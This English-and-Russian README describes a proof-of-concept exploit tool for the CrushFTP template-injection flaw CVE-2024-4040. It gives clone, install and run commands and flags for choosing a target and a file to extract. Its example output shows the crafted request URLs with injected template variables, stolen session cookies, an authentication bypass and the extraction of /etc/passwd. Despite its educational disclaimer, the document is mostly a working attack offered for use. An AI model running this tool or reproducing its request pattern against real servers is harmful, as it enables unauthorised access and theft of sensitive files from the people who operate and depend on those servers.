
# EN
**GenCrushSSTIExploit** is a PoC exploit tool targeting the `SSTI` (Server-Side Template Injection) vulnerability in CrushFTP `CVE-2024-4040`. This tool demonstrates how to exploit this vulnerability for educational and ethical hacking purposes only. 

## Features
- Establishes a session with the CrushFTP server to extract authentication cookies.
- Exploits the SSTI vulnerability to inject payloads.
- Attempts to bypass authentication and extract sensitive files from the server.
- Uses `rich` for beautiful and styled console output.

## Disclaimer
**⚠️ Use this tool responsibly! It is intended for research and educational purposes only. The author is not responsible for any misuse or damage caused by this tool.**


## Installation
### Prerequisites
- Python 3.7+
- `pip` (Python package installer)

### Clone the Repository
```bash
git clone https://github.com/geniuszly/GenCrushSSTIExploit
cd GenCrushSSTIExploit
```

### Install Required Packages
```bash
pip install -r requirements.txt
```

---

## Usage
### Basic Command
```bash
python GenCrushSSTIExploit.py -t <TARGET_URL>
```

- **`-t / --target`**: Specifies the target URL of the vulnerable CrushFTP server.

### Optional Parameters
- **`-l / --lfi`**: Local File Inclusion. Specifies the file to be included for extraction.
- **`-w / --wordlist`**: Specifies a wordlist for brute-forcing file paths.

## Example
```bash
python GenCrushSSTIExploit.py -t http://example.com -l /etc/passwd
```

## Example Output

```
★ Добро пожаловать в GenCrushSSTIExploit ★
CrushFTP SSTI PoC (CVE-2024-4040)
Автор: geniuszly
Использование: только для учебных и этических целей
--------------------------------------------------

[*] Подключение к ServerSessionAJAX...

[+] Успешно подключено к ServerSessionAJAX
[+] Куки CrushAuth: abc123def456ghi789
[+] Куки currentAuth: xyz987

[*] Попытка эксплуатации уязвимости SSTI...

[+] URL: http://example.com/WebInterface/function/?c2f=xyz987&command=zip&path={hostname}&names=/a

[+] Успешная эксплуатация уязвимости SSTI
[+] Ответ сервера: Hostname: example.com

[*] Попытка обхода аутентификации...

[+] URL: http://example.com/WebInterface/function/?c2f=xyz987&command=zip&path={working_dir}&names=/a

[+] Обход аутентификации успешен
[+] Извлечение /etc/passwd...
[+] Успешное извлечение /etc/passwd
[+] Извлеченное содержимое:
root:x:0:0:root:/root:/bin/bash
...
```

# RU
**GenCrushSSTIExploit** — это PoC инструмент эксплуатации уязвимости `SSTI` (Server-Side Template Injection) в CrushFTP `CVE-2024-4040`. Этот инструмент демонстрирует, как использовать данную уязвимость в образовательных и этических целях.

## Возможности
- Устанавливает сессию с сервером CrushFTP для извлечения куки аутентификации.
- Эксплуатирует уязвимость SSTI для внедрения полезных нагрузок.
- Пытается обойти аутентификацию и извлечь конфиденциальные файлы с сервера.
- Использует `rich` для красивого и стилизованного вывода на консоль.

## Отказ от ответственности
**⚠️ Используйте этот инструмент ответственно! Он предназначен только для исследований и образовательных целей. Автор не несет ответственности за любое неправильное использование или ущерб, причиненный этим инструментом.**


## Установка
### Предварительные требования
- Python 3.7+
- `pip` (менеджер пакетов Python)

### Клонирование репозитория
```bash
git clone https://github.com/geniuszly/GenCrushSSTIExploit
cd GenCrushSSTIExploit
```

### Установка необходимых пакетов
```bash
pip install -r requirements.txt
```

---

## Использование
### Основная команда
```bash
python GenCrushSSTIExploit.py -t <ЦЕЛЕВОЙ_URL>
```

- **`-t / --target`**: Указывает целевой URL уязвимого сервера CrushFTP.

### Дополнительные параметры
- **`-l / --lfi`**: Включение локального файла. Указывает файл для извлечения.
- **`-w / --wordlist`**: Указывает словарь для перебора путей к файлам.

## Пример
```bash
python GenCrushSSTIExploit.py -t http://example.com -l /etc/passwd
```

## Пример вывода

```
★ Добро пожаловать в GenCrushSSTIExploit ★
CrushFTP SSTI PoC (CVE-2024-4040)
Автор: geniuszly
Использование: только для учебных и этических целей
--------------------------------------------------

[*] Подключение к ServerSessionAJAX...

[+] Успешно подключено к ServerSessionAJAX
[+] Куки CrushAuth: abc123def456ghi789
[+] Куки currentAuth: xyz987

[*] Попытка эксплуатации уязвимости SSTI...

[+] URL: http://example.com/WebInterface/function/?c2f=xyz987&command=zip&path={hostname}&names=/a

[+] Успешная эксплуатация уязвимости SSTI
[+] Ответ сервера: Hostname: example.com

[*] Попытка обхода аутентификации...

[+] URL: http://example.com/WebInterface/function/?c2f=xyz987&command=zip&path={working_dir}&names=/a

[+] Обход аутентификации успешен
[+] Извлечение /etc/passwd...
[+] Успешное извлечение /etc/passwd
[+] Извлеченное содержимое:
root:x:0:0:root:/root:/bin/bash
...
```
